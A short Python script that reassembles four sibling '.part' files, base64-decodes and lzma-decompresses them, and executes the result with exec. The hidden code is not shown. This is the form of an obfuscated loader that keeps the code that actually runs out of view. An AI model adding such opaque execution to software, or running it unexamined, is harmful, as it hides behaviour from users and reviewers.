from __future__ import annotations

import base64
import lzma
from pathlib import Path

path = Path(__file__)
payload = "".join(
    Path(f"{path}.part{index}").read_text(encoding="utf-8").strip()
    for index in range(1, 5)
)
source = lzma.decompress(base64.b64decode(payload))
exec(compile(source, str(path), "exec"))
